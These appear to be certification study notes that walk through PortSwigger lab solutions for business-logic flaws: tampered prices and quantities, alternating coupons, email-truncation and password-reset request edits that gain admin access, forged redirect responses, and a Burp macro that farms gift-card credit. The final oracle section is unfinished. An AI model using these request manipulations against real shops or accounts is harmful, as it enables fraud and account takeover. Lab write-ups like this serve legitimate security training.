# Excessive trust in client-side controls
1. Turn on Proxy intercept and capture request to add l33t jacket to cart
2. Change `price` parameter to `1`
```
productId=1&redir=PRODUCT&quantity=1&price=1
```
1. Check cart and total is `$0.01`
# High-level logic vulnerability
1. Put l33t jacket in cart
2. Capture POST request adding item and set `quantity` parameter to `-2`
3. Check cart and see quantity is `-1` making cart total `-$1337.00`
4. Make l33t jacket quantity `1`
5. Place another item in the cart and repeat step `3` to make item go into the negative quantity reducing cart total (cart total must be a positive integer)
```
productId=2&redir=PRODUCT&quantity=-15
```
- You will need to calculate how many items are needed to manipulate the cart total
# Inconsistent security controls
1. Register account on site using exploit server email
	- Take note of the message saying "If you work for DontWannaCry, please use your @dontwannacry.com email address"
2. Authenticate to the website with your new account
3. Update account details and change email to `@dontwannacry.com`
4. Access admin panel > Delete Carlos user
# Flawed enforcement of business rules
1. Subscribe at the bottom of the page
2. Identify new customer code at top of page
	1. We have two discount codes
```
NEWCUST5
SIGNUP30
```
3. Add l33t jacket to cart
4. Apply both discount codes
5. Codes can be applied multiple times as long as they are alternating
6. Repeat process until you can buy jacket
# Low-level logic flaw
1. Add l33t jacket to cart
2. Modify `quantity` parameter to `99` and submit request (limit is `99` per request)
```
productId=1&redir=PRODUCT&quantity=99
```
3. Send request to repeater and use Payload type: `Null payloads`
4. Configure the payload to run ~500 times
5. Check basket and cart total will have entered a negative integer
6. Add a second item and use a calculator to determine how many items you need to make the cart total a small positive integer
7. Eventually you'll get a cart looking like

| Name         | Price    | Quantity |
| ------------ | -------- | -------- |
| l33t jacket  | $1337.00 | 29712    |
| Picture box  | $64.13   | 370      |
| AbZorba Ball | $83.55   | 38313    |
8. Cart total is now a small enough positive integer to make purchase
# Inconsistent handling of exceptional input
1. Register account on site using exploit server email
	- Take note of the message saying "If you work for DontWannaCry, please use your @dontwannacry.com email address"
2. After registering and logging in, you can see your email but you cannot change it
3. Register second account and intercept the request
4. Test overflowing the email value
```
username=user1&email=testing123@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exploit-0a9900060362357b82cba7c101400098.exploit-server.net&password=password
```
5. Authenticate with this user and confirm the email presented to you on your "My Account" page is cut off showing
```
Your email is: testing123@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
6. Copy entire email field and use `wc` to determine number of characters
```sh
echo -n "{{copied data}}" | wc -c
```
- Field is `255` characters
- Subtract the `17` from `@dontwannacry.com`  = `238`
7. Register a new account and overflow the email parameter so your account is registered under the `@dontwannacry.com` but the email is still sent to the exploit server
```
username=user3&email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%40dontwannacry.com.exploit-0a9900060362357b82cba7c101400098.exploit-server.net&password=password
```
8. Authenticate with this user and you will see admin panel
9. "My account" page presents the following:
```
Your email is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com
```
# Weak isolation on dual-use endpoint
1. Login to application
2. "My account" page has options to change email and password
3. Intercept POST request to change password of your account
```
username=wiener&current-password=peter&new-password-1=password&new-password-2=password
```
4. Changing `username` parameter to `Administrator` returns a `302` redirect to login
5. Remove the `current-password` parameter from the request and receive `200 OK` indicating password has changed
6. Authenticate as Administrator to application > Delete user `Carlos`
# Insufficient workflow validation
1. Place order for product that can be afforded
2. Intercept Request and Responses
	- Collect the following URL when order is successful
```
Request:
POST /car/checkout

Response:
303 See Other
Location: /cart/order-confirmation?order-confirmed=true
```
3. Armed with this URL place an order on l33t jacket and intercept the "check out" request
4. Modify HTTP response from error to confirm
```
ORIGINAL:
HTTP/2 303 See Other
Location: /cart?err=INSUFFICIENT_FUNDS

EDITED:
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
```
5. Order will be placed
# Authentication bypass via flawed state machine
- Normal authentication flow is:
	1. Authenticate
	2. `302` to `/role-selector` > Select Role (`user` or `content-author`)
	3. `302` to `/my-account?id={username}`
- Bypass authentication:
1. Intercept authentication request
2. Modify HTTP response changed `302` redirect straight to `/my-account?id={username}` (make username the account you authenticated with)
3. Forward request (you will receive `302` redirect to `/login` - Do not change > Turn of intercept)
4. On login page you will see `Admin panel` > Delete Carlos
# Infinite money logic flaw
1. Signup at bottom and receive code `SIGNUP30` for discount
2. Gift cards can be bought for `$10.00` > Add to cart
3. Apply discount coupon and purchase gift card > Place order
4. Order confirmation page reveals gift card code
5. Copy code > My account > Enter gift card code > Redeem
6. `$3.00` has been gained
- **Configure Burp macros to automate process:**
1. Settings > Session > Macros > Add
![1](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/addMacro.png)
2. Select the 5 requests made to complete the gift card purchase and code redeem:
	1. Add gift card to cart
	2. Apply discount code in cart
	3. Complete purchase
	4. Retrieve gift card code to redeem
	5. Redeem gift card
![2](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/macroRecorder.png)
3. Select order confirmation request > Configure item > Add
![3](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/orderConfirmConfigure.png)
![4](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/orderConfirmConfigureMacroItem.png)
4. Define custom parameter > Parameter name = `gift-card` > Select gift card code from HTTP response > OK > OK to close window
![5](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/orderConfirmConfigureDefineCustomParameter.png)
5. Select redeem gift card request > Configure item > Add
![6](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/redeemGiftCardConfigure.png)
6. Configure gift card parameter > `Derive from prior response` > `Response 4` > OK
![7](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/redeemGiftCardConfigureMacroItem.png)
7. Test macro and confirm `gift-card` parameter is unique (perform this twice to be sure)
![8](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/testMacro.png)
![9](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/testMacroConfirmation.png)
8. Check account page and confirm store credit is incrementing
9. Select OK to close Macro editor
10. Settings > Session > Session handling rules > Add
![10](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/sessionHandlingRulesAdd.png)
11. Rules actions > Add > Run Macro
![11](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/sessionHandlingRulesAdd.png)
12. Select the macro created in the previous steps > OK 
![12](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/sessionHandlingSelectMacro.png)
13. Scope > URL scope > Use custom scope > Add > Paste GET request on `/my-account?id=wiener`
![13](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/sessionHandlingRulesScope.png)
14. OK to close
15. Use repeater tab and send GET request to `/my-account?id=wiener` > Search for `credit` and confirm the credit is incrementing by `$3.00`
![14](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/getMyAccountRequest1.png)
![15](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/getMyAccountRequest2.png)
16. Send `/my-account?id=wiener` request to Intruder
17. Configure Intruder
	1. Payload type: Null payloads
	2. Payload configuration: Continue indefinitely
	3. Resource pool > Create new resource pool > Maximum concurrent requests: 1 > Delay between requests: 100
	4. Settings > Grep - Extract > Extract the store credit money value e.g. `$50.00`
![16](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/intruderPayloads.png)
![17](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/intruderResourcePool.png)
![18](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/intruderSettings.png)
18. Start Attack > Review results and confirm credit value is going up
![19](https://github.com/MINEGOBLIN/BSCP/blob/main/Business%20Logic%20Vulnerabilities/Resources/Images/intruderResults.png)
19. Keep going until you have enough to buy the l33t jacket
# Authentication bypass via encryption oracle
1. Authenticate with "Stay logged in" selected
2. Generates an encrypted `stay-logged-in` session cookie
3. Navigate to post and submit comment with incorrect email
	- This generates a `notification` cookie which is also encrypted using the same method 
	- Loading post page with this cookie presents the decrypted `notification` cookie output in the HTTP response
	- This data is controllable via the POST request `email` parameter
4. Decrypt current `stay-logged-in` cookie and returns a username and Linux timestamp
```
wiener:123456890
```
5. Submit `administrator:123456890` as a email and confirm notification cookie decrypts to that value
## To-do
- I have not figured out how to exploit this, replacing cookie does not work
